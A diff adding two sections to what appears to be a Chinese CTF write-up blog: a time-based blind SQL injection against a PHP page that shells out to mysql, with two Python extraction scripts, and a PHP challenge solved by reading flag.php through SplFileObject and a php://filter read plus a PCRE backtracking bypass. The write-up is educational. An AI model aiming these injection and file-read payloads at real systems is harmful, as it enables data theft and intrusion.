@@ -286,6 +286,8 @@
             <li><a href="#week4-no-jwt">[Week4] No JWT</a></li>
             <li><a href="#week3-ez_php_jail">[Week3] ez_php_jail</a></li>
             <li><a href="#week3-玩原神玩的">[Week3] 玩原神玩的</a></li>
+            <li><a href="#week4-only-one-sql">[Week4] only one sql</a></li>
+            <li><a href="#fin-1z_php">[Fin] 1z_php</a></li>
           </ol>
         </li>
       </ol>
@@ -1531,6 +1533,198 @@
 	loading="lazy"
 	
 		alt="image-20240918214306766"
+	
+	
+></p>
+<hr>
+<h4 id="week4-only-one-sql">[Week4] only one sql
+</h4><p>源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
+</span></span><span class="line"><span class="cl">$sql = $_GET[&#39;sql&#39;];
+</span></span><span class="line"><span class="cl">if (preg_match(&#39;/select|;|@|\n/i&#39;, $sql)) {
+</span></span><span class="line"><span class="cl">    die(&#34;你知道的，不可能有sql注入&#34;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">if (preg_match(&#39;/&#34;|\$|`|\\\\/i&#39;, $sql)) {
+</span></span><span class="line"><span class="cl">    die(&#34;你知道的，不可能有RCE&#34;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">//flag in ctf.flag
+</span></span><span class="line"><span class="cl">$query = &#34;mysql -u root -p123456 -e \&#34;use ctf;select &#39;没有select，让你执行一句又如何&#39;;&#34; . $sql . &#34;\&#34;&#34;;
+</span></span><span class="line"><span class="cl">system($query);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此题不能用select，可以通过show databases和show tables查库名和表名，后面发现题目注释里面其实写了<code>//flag in ctf.flag</code>,在ctf库的flag表中</p>
+<p>直接利用show columns查看到flag表的字段，估计就在data里面。这里不能用select，我们可以尝试delete进行盲注</p>
+<p><img src="/img/image-20240919105013046.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919105013046"
+	
+	
+></p>
+<p>贴一下官方的wp,是真的简洁高效啊，这就是我和大佬的差距吗</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sqlstr</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="s2">&#34;{}&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://your.website/?sql=delete</span><span class="si">%20f</span><span class="s2">rom</span><span class="si">%20f</span><span class="s2">lag%20where</span><span class="si">%20d</span><span class="s2">ata</span><span class="si">%20li</span><span class="s2">ke</span><span class="si">%20%</span><span class="s2">27&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">end</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">%25%</span><span class="s2">27%20and</span><span class="si">%20s</span><span class="s2">leep(5)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">sqlstr</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span><span class="n">flag</span><span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">end</span>
+</span></span><span class="line"><span class="cl">        <span class="n">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">+</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="n">c</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>经过查表和对flag格式的了解，flag的内容就在小写字母，数字和这几个符号之间，生成一个列表进行枚举</p>
+<p><img src="/img/image-20240919105417069.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919105417069"
+	
+	
+></p>
+<p>我的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">time</span>
+</span></span><span class="line"><span class="cl"><span class="n">list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;-&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span> <span class="c1">#小写字母和符号</span>
+</span></span><span class="line"><span class="cl">    <span class="n">list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span><span class="mi">58</span><span class="p">):</span>  <span class="c1">#数字</span>
+</span></span><span class="line"><span class="cl">    <span class="n">list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># print(list)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#delete from flag where data like &#39;f%&#39; and sleep(3)--</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://challenge.basectf.fun:27082/?sql=delete from flag where data like &#39;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">end</span> <span class="o">=</span> <span class="s2">&#34;%&#39; and sleep(3)--&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">j</span> <span class="o">+</span> <span class="n">end</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">use_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">use_time</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/image-20240919120747933.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919120747933"
+	
+	
+></p>
+<hr>
+<h4 id="fin-1z_php">[Fin] 1z_php
+</h4><p>这道题考察原生类(读取文件类SplFileObject)和PCRE回溯</p>
+<p>脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;http://challenge.basectf.fun:28522/?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;try&#34;</span><span class="p">:</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">1000001</span> <span class="o">+</span> <span class="s2">&#34;HACKER&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/image-20240919125412587.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919125412587"
+	
+	
+></p>
+<p><img src="/img/image-20240919125422502.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240919125422502"
 	
 	
 ></p>
